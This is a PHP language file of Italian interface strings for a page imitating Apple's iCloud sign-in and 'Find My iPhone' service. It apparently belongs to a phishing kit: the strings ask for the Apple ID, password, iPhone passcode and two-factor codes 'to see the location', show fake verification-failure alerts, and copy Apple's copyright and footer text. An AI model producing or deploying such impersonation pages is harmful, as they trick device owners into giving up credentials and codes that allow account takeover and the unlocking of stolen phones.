<?php

$lang = array();
$lang["PAGE_TITLE"] = "iCloud";
$lang["SETUP_INSTRUCTIONS"] = "Istruzioni di configurazione";
$lang["MOB_locating"] = "Locating...";
$lang["ALERT1"] = "Autenticazione richiesta";
$lang["ALERT2"] = "Inserisci il tuo ID Apple e la password";
$lang["ALERT3"] = "per vedere la posizione.";
$lang["ALERT4"] = "Il tuo ID Apple o la password non erano corretti.";
$lang["HELP"] = "Aiuto";
$lang["VERIFY"] = "Verifica la tua identità.";
$lang["PROTECTED"] = "Il tuo ID Apple è protetto con autenticazione a due fattori.";
$lang["CODESHOWN"] = "Inserisci il codice di accesso del tuo iPhone o il codice di verifica mostrato sugli altri dispositivi.";
$lang["VERIFYING"] = "verifica...";
$lang["SIGN_IN_TITLE"] = "Accedi a iCloud";
$lang["APPLE_ID"] = "ID Apple";
$lang["PASSWORD"] = "Password";
$lang["KEEP_ME"] = "Mantieni laccesso";
$lang["FORGOT_ID"] = "Hai dimenticato l ID Apple o la password?";
$lang["DONT_HAVE_ID"] = "Non hai ID Apple?";
$lang["CREATE_YOURS"] = "Crea subito il tuo.";
$lang["Create_Footer"] = "Crea un ID Apple";
$lang["CHECK_ACTIVATION"] = "Controlla lo stato del Blocco attivazione";
$lang["SYSTEM_STATUS"] = "Stato del sistema";
$lang["POLICY"] = "Norme sulla privacy";
$lang["TERMS"] = "Termini e condizioni";
$lang["COPYRIGHT"] = "Copyright © 2020 Apple Inc. Tutti i diritti riservati";
$lang["MOB_PAGE_TITLE"] = "iCloud";
$lang["MOB_FIND"] = "Trova il mio iPhone";
$lang["MOB_APPLE_ID"] = "ID Apple";
$lang["MOB_EXAMPLE"] = "E-mail";
$lang["MOB_PASSWORD"] = "Password";
$lang["MOB_REQUIRED"] = "Required";
$lang["MOB_LOGIN"] = "Accedi...";
$lang["MOB_FORGOT_ID"] = "Hai dimenticato l D Apple o la password?";
$lang["MOB_SETUP_INSTRUCTIONS"] = "Istruzioni di configurazione";
$lang["MOB_locating"] = "Locating...";
$lang["WELCOME"] = "Benvenuto a";
$lang["IMPROVE"] = "Migliora la possibilità di trovare i tuoi iDevice anche quando non sono connessi a Internet.";
$lang["MOMENT"] = "Potrebbero essere necessari alcuni minuti per individuare il tuo iPhone perso.";
$lang["IDPWD_ERROR_ALERT1"] = "Verification Failed";
$lang["IDPWD_ERROR_ALERT2"] = "il tuo ID Apple o la password non sono corretti.";

?>